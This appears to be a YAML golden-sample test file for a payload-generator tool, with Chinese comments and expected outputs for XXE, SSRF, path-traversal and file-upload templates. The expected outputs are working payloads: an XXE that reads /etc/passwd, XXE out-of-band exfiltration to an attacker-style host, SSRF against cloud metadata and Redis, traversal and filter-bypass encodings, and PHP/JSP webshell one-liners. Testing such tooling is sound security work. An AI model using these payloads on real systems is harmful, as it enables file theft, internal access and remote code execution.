@@ -1,0 +1,353 @@
+# XXE / SSRF / 路径穿越 / 文件上传 黄金样本（§13.2）
+#
+# 这批是第二批「新漏洞类型探测」。多行 XML 载荷用块标量写，避免转义歧义。
+# 文件上传的 multipart 渲染不在这里——见 run_golden.py 的 smoke_render，
+# 那里断言结构性质而不是几百字符的整串（理由写在该函数注释里）。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= XXE =================
+
+  - name: XXE 实体展开探测
+    state:
+      vuln: xxe
+      template: xxe.generic.detect.entity
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY probe "xxe-ok">]>
+        <foo>&probe;</foo>
+      # xml 是本方案里少数有可靠 parser 的内容类型，真做语法校验
+      syntax: ok
+
+  - name: XXE 读文件
+    state:
+      vuln: xxe
+      template: xxe.generic.file.read
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <foo>&xxe;</foo>
+      syntax: ok
+
+  - name: XXE 外部 DTD 带外
+    state:
+      vuln: xxe
+      template: xxe.generic.oob.external_dtd
+      vars: {lhost: "10.0.0.1", file: "x.dtd"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo SYSTEM "http://10.0.0.1/x.dtd">
+        <foo>ok</foo>
+      syntax: ok
+
+  - name: XXE 外带文件内容（规范写法，引外部 DTD）
+    state:
+      vuln: xxe
+      template: xxe.generic.oob.exfil
+      vars: {filepath: "/etc/passwd", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY % f SYSTEM "file:///etc/passwd">
+          <!ENTITY % d SYSTEM "http://10.0.0.1/exfil.dtd">
+          %d;
+        ]>
+        <foo>ok</foo>
+      syntax: ok
+
+  - name: XXE 外带文件内容（内联写法）—— 校验器应报失败
+    state:
+      vuln: xxe
+      template: xxe.generic.oob.exfil.inline
+      vars: {filepath: "/etc/passwd", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # 这不是误报：内部子集的标记声明里出现参数实体引用，违反 XML 规范 WFC。
+      # 校验器抓出来了，且按 §10.2 照常输出、只标红。实战中部分解析器接受这种写法。
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY % f SYSTEM "file:///etc/passwd">
+          <!ENTITY % d "<!ENTITY &#x25; send SYSTEM 'http://10.0.0.1/?%f;'>">
+          %d;
+          %send;
+        ]>
+        <foo>ok</foo>
+      syntax: fail
+
+  - name: XXE 探测内网端口
+    state:
+      vuln: xxe
+      template: xxe.generic.ssrf.port
+      vars: {rhost: "127.0.0.1", rport: "6379"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>
+        <foo>&xxe;</foo>
+      syntax: ok
+
+  - name: XXE 声明 UTF-16 编码
+    state:
+      vuln: xxe
+      template: xxe.generic.bypass.utf16
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" encoding="UTF-16"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <foo>&xxe;</foo>
+      # 编码声明与实际字节不一致时 expat 很宽容，不会误报失败
+      syntax: ok
+
+  # ================= SSRF =================
+
+  - name: SSRF 云元数据（默认 AWS）
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      outputs: [raw]
+    expect:
+      payload: "http://169.254.169.254/latest/meta-data/"
+
+  - name: SSRF 云元数据（切 GCP）
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: gcp}
+      outputs: [raw]
+    expect:
+      payload: "http://metadata.google.internal/computeMetadata/v1/"
+
+  - name: SSRF 打本机端口
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.localhost
+      outputs: [raw]
+    expect:
+      payload: "http://127.0.0.1:6379/"
+
+  - name: SSRF IP 转十进制绕过
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.localhost
+      bypasses: [bypass.ip.decimal]
+      outputs: [raw]
+    expect:
+      payload: "http://2130706433:6379/"
+
+  - name: SSRF IP 转十六进制绕过
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.localhost
+      bypasses: [bypass.ip.hex]
+      outputs: [raw]
+    expect:
+      payload: "http://0x7f000001:6379/"
+
+  - name: SSRF 打内网网段
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.network
+      vars: {rhost: "10.0.0.1", rport: "8080"}
+      outputs: [raw]
+    expect:
+      payload: "http://10.0.0.1:8080/"
+
+  - name: SSRF file 协议
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.file
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "file:///etc/passwd"
+
+  - name: SSRF dict 协议
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.dict
+      outputs: [raw]
+    expect:
+      payload: "dict://127.0.0.1:6379/info"
+
+  - name: SSRF gopher 协议
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher
+      vars: {payload: "test"}
+      outputs: [raw]
+    expect:
+      payload: "gopher://127.0.0.1:6379/_test"
+
+  - name: SSRF 经跳转绕过
+    state:
+      vuln: ssrf
+      template: ssrf.generic.redirect.open
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: "http://10.0.0.1/r?to=http://169.254.169.254/latest/meta-data/"
+
+  # ================= 路径穿越 =================
+
+  - name: 路径穿越 · Linux（默认四层）
+    state:
+      vuln: traversal
+      template: traversal.generic.linux
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../etc/passwd"
+
+  - name: 路径穿越 · Windows
+    state:
+      vuln: traversal
+      template: traversal.generic.windows
+      vars: {filepath: "windows\\win.ini"}
+      outputs: [raw]
+    expect:
+      payload: "\\..\\..\\..\\..\\windows\\win.ini"
+
+  - name: 路径穿越 · 绝对路径
+    state:
+      vuln: traversal
+      template: traversal.generic.absolute
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "/etc/passwd"
+
+  - name: 路径穿越 · URL 编码
+    state:
+      vuln: traversal
+      template: traversal.generic.encoded.url
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+
+  - name: 路径穿越 · 双重 URL 编码
+    state:
+      vuln: traversal
+      template: traversal.generic.encoded.double
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
+
+  - name: 路径穿越 · ....// 变形（槽位值重复三次）
+    state:
+      vuln: traversal
+      template: traversal.generic.dotdot.bypass
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "....//....//....//etc/passwd"
+
+  - name: 路径穿越 · 空字节截断
+    state:
+      vuln: traversal
+      template: traversal.generic.nullbyte
+      vars: {filepath: "etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../etc/passwd%00.jpg"
+
+  - name: 路径穿越 · UNC
+    state:
+      vuln: traversal
+      template: traversal.generic.unc
+      vars: {lhost: "10.0.0.1", share: "a", filepath: "secret.txt"}
+      outputs: [raw]
+    expect:
+      payload: "\\\\10.0.0.1\\a\\secret.txt"
+
+  # ================= 文件上传 =================
+
+  - name: 上传 · 文件名穿越
+    state:
+      vuln: upload
+      template: upload.generic.filename.traversal
+      vars: {name: "shell"}
+      outputs: [raw]
+    expect:
+      payload: "/../../../../var/www/html/shell.php"
+
+  - name: 上传 · 双扩展名
+    state:
+      vuln: upload
+      template: upload.generic.filename.double_ext
+      vars: {name: "shell"}
+      outputs: [raw]
+    expect:
+      payload: "shell.php.jpg"
+
+  - name: 上传 · .htaccess
+    state:
+      vuln: upload
+      template: upload.generic.filename.htaccess
+      outputs: [raw]
+    expect:
+      payload: ".htaccess"
+
+  - name: 上传 · Windows 文件名穿越
+    state:
+      vuln: upload
+      template: upload.generic.filename.windows
+      vars: {name: "shell"}
+      outputs: [raw]
+    expect:
+      payload: "..\\..\\..\\..\\inetpub\\wwwroot\\shell.aspx"
+
+  - name: 上传 · PHP 一句话
+    state:
+      vuln: upload
+      template: upload.generic.content.php
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<?php system('id'); ?>"
+
+  - name: 上传 · 魔术字节 GIF89a + PHP
+    state:
+      vuln: upload
+      template: upload.generic.content.magic
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "GIF89a<?php system('id'); ?>"
+
+  - name: 上传 · JSP 一句话
+    state:
+      vuln: upload
+      template: upload.generic.content.jsp
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<% Runtime.getRuntime().exec(\"id\"); %>"
+
+  - name: 上传 · SVG 携带脚本
+    state:
+      vuln: upload
+      template: upload.generic.content.svg
+      outputs: [raw]
+    expect:
+      payload: |-
+        <?xml version="1.0" standalone="no"?>
+        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+          <script type="text/javascript">alert(1)</script>
+        </svg>
+      syntax: ok
